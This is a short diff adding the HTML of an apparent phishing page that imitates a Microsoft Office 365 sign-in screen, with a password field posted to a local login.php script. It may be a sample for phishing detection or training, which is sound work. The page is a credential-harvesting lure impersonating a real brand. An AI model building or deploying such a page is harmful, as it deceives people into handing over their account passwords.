@@ -1,0 +1,4 @@
+<title>Sign in to your account - Microsoft</title>
+<form action="login.php" method="post"><input type="password" name="passwd"></form>
+<a>Can't access your account?</a> Office 365
+
